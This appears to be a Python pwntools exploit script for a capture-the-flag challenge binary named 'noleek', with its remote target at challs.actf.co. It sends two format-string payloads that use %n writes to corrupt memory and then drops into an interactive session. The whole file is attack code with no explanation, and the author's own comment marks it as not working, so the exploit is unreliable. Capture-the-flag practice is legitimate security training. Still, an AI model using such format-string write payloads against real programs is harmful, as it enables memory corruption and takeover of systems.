#!/usr/bin/env python3

from pwn import *
# WARNING: not working

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./noleek_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("challs.actf.co", 31400)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	r.recvuntil(b'leek? ')
	r.sendline(b'%65296p%*13$p%13$hn')
	r.recvuntil(b'more leek? ')
	r.sendline(b'%678166p%*12$p%42$n')

	r.interactive()


if __name__ == "__main__":
	main()
